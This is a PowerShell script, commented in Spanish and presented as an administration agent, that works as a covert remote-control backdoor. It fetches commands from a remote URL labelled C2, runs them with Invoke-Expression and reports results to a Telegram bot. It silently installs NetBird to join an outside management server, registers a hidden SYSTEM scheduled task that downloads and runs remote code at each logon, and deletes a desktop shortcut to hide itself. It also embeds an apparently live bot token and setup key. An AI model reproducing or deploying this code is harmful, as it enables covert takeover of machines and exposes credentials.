# ===========================================================================
# AGENTE CONTICS V4 - CORREGIDO
# Administrador: Jhonathan De La Cruz
# ===========================================================================

# --- CONFIGURACION DE RUTAS ---
$TelegramToken = '8693420261:AAH0RQ-7LySZ03gglYDYOjJbY1xJonv_fak'
$TelegramChatID = '6902736310'

# Reemplaza con tus URLs reales de GitHub (Enlaces RAW)
$GitHubRawUrl = 'TU_URL_RAW_DE_AGENT_WIN_PS1'
$TaskUrl      = 'TU_URL_RAW_DE_TAREA_TXT'

# --- CONFIGURACION DE RED ---
$mUrl   = 'https://contics-admin.duckdns.org'
$sKey   = '8552E0C2-4E0A-490D-8B93-E2CD69CDC007'
$nbPath = 'C:\Program Files\NetBird\netbird.exe'

# --- FUNCION DE NOTIFICACION ---
function Send-Telegram {
    param([string]$Message)
    try {
        $Url = "https://api.telegram.org/bot$($TelegramToken)/sendMessage"
        $Body = @{ chat_id = $TelegramChatID; text = $Message; parse_mode = 'Markdown' }
        $Json = $Body | ConvertTo-Json -Compress
        $utf8 = [System.Text.Encoding]::UTF8.GetBytes($Json)
        Invoke-RestMethod -Uri $Url -Method Post -Body $utf8 -ContentType "application/json; charset=utf-8"
    } catch { }
}

# --- 1. RECEPTOR DE COMANDOS (C2) ---
try {
    $Command = (Invoke-WebRequest -Uri $TaskUrl -UseBasicParsing -ErrorAction SilentlyContinue).Content
    if ($null -ne $Command) {
        $Command = $Command.Trim()
        if ($Command -ne "NONE" -and $Command -ne "") {
            Send-Telegram -Message "⚡ *ORDEN RECIBIDA EN:* $env:COMPUTERNAME`n*Comando:* `$Command"
            $Result = Invoke-Expression $Command 2>&1 | Out-String
            if ($Result) {
                Send-Telegram -Message "✅ *RESULTADO:*`n$Result"
            } else {
                Send-Telegram -Message "✅ *ORDEN EJECUTADA*"
            }
        }
    }
} catch {
    Send-Telegram -Message "❌ *ERROR C2:* $($_.Exception.Message)"
}

# --- 2. GESTION DE RED (NETBIRD) ---
if (!(Test-Path $nbPath)) {
    $installer = "$env:TEMP\nb.exe"
    Invoke-WebRequest -Uri 'https://github.com/netbirdio/netbird/releases/latest/download/netbird_installer_windows_amd64.exe' -OutFile $installer -UseBasicParsing
    Start-Process -FilePath $installer -ArgumentList '/S', '/component=service' -Wait
    Start-Sleep -Seconds 5
}

$statusCheck = & $nbPath status
if ($statusCheck -notmatch 'Connected') {
    & $nbPath down | Out-Null
    & $nbPath up --management-url $mUrl --setup-key $sKey | Out-Null
}

# --- 3. REPORTE DE IP ---
$finalStatus = & $nbPath status | Select-String 'NetBird IP:'
if ($finalStatus) {
    $nbIP = ($finalStatus.ToString() -split ':')[1].Trim() -split '/' | Select-Object -First 1
    Send-Telegram -Message "*[OK] NODO CONECTADO*`n*PC:* $env:COMPUTERNAME`n*IP:* $nbIP"
}

# --- 4. PERSISTENCIA (TAREA PROGRAMADA) ---
try {
    $TaskName = "Contics_Manager"
    $ActionScript = "powershell.exe -WindowStyle Hidden -Command `"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; iex (iwr '$GitHubRawUrl' -UseBasicParsing)`""
    
    Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false -ErrorAction SilentlyContinue
    
    $Action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument "-WindowStyle Hidden -Command `"$ActionScript`""
    $Trigger = New-ScheduledTaskTrigger -AtLogOn 
    $Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -StartWhenAvailable -DontStopIfGoingOnBatteries
    $Principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
    
    Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger -Settings $Settings -Principal $Principal | Out-Null
} catch { }

# Limpieza final
if (Test-Path 'C:\Users\Public\Desktop\NetBird.lnk') { Remove-Item -Path 'C:\Users\Public\Desktop\NetBird.lnk' -Force }
